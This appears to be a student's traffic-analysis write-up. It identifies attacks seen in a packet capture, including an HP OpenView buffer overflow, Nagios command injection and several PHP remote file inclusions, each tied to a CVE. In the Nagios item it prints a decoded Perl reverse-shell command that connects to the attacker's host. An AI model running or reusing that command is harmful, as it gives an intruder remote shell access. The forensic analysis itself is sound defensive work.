According to graph generated in Q2, lot of http traffic was observed during
interval (120s-150s), so I decided to analyze it using wireshark.

I could see a lot of attacks happening during this interval.

Following is the list of identified attacks, and corresponding description:

1) Attack details:

Attacker: 192.168.202.102 Target: 192.168.23.152 CVE: CVE-2009-4179 Target
Service: HP OpenView Node Manager 7.01, 7.51, 7.53

Description:

The attacker made a very long GET request which looked as an attempt for buffer
overflow. Request contained a keyword "ovaalarm.exe" using which I was able to
identify the CVE.

According to CVE, its an stack-based overflow attack in above mentioned target
service which allows remote attackers to execute arbitrary code via long HTTP
Accept Language Header.

The corresponding payload is dumped in "data/CVE-2009-4179.txt" file

2) Attacker: 192.168.202.96 Target: 192.168.25.152 CVE: CVE-2007-2328 Target
Service: PHP remote file inclusion in phpMYTGP 1.4b

Description: PHP remote file inclusion vulnerability in addvip.php in phpMYTGP
1.4b allows remote attackers to execute arbitrary PHP code via a URL in the
msetstr[PROGSDIR] parameter. 

The corresponding payload is dumped in "data/CVE-2007-2328.txt" file

3) Attacker: 192.168.202.96 Target: 192.168.25.152 CVE: CVE-2009-2288 Target
Service: Nagios

Description: statuswml.cgi in Nagios before 3.1.1 allows remote attackers to
execute arbitrary commands via shell metacharacters in the (1) ping or (2)
Traceroute parameters. 

I tried to decode the shell command tried to be executed by attacker and got the
following result: "; perl -MIO -e '$p=fork;exit,if($p);$c=new
IO::Socket::INET(PeerAddr,"192.168.202.96:25527");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_
while<>;'|&"

Seems like an attept to fork new process and open IO socket to attacker's host.

The corresponding payload is dumped in "data/CVE-2009-2288.txt" file

4) Attacker: 192.168.202.96 Target: 192.168.25.152 CVE: CVE-2009-4223 Target
Service: PHP remote file inclusion in KR-web 1.1b2 and earlier

Description: PHP remote file inclusion vulnerability in adm/krgourl.php in
KR-Web 1.1b2 and earlier allows remote attackers to execute arbitrary PHP code
via a URL in the DOCUMENT_ROOT parameter. 

The corresponding payload is dumped in "data/CVE-2009-4223.txt" file

5) Attacker: 192.168.202.96 Target: 192.168.25.152 CVE: CVE-2007-4341 Target
Service: PHP remote file inclusion in Omnistart Lib2 PHP 0.2

Description: PHP remote file inclusion vulnerability in adm/my_statistics.php in
Omnistar Lib2 PHP 0.2 allows remote attackers to execute arbitrary PHP code via
a URL in the DOCUMENT_ROOT parameter. 

The corresponding payload is dumped in "data/CVE-2007-4341.txt" file

6) Attacker: 192.168.202.96 Target: 192.168.25.102 CVE: CVE-2006-2152 Target
Service: PHP remote file inclusion in phpBB Advanced Guestbook 2.4.0 and earlier

Description: PHP remote file inclusion vulnerability in admin/addentry.php in
phpBB Advanced Guestbook 2.4.0 and earlier, when register_globals is enabled,
allows remote attackers to include arbitrary files via the phpbb_root_path
parameter. 

The corresponding payload is dumped in "data/CVE-2006-2152.txt" file

There were few more PHP remote file inclusion type attacks.
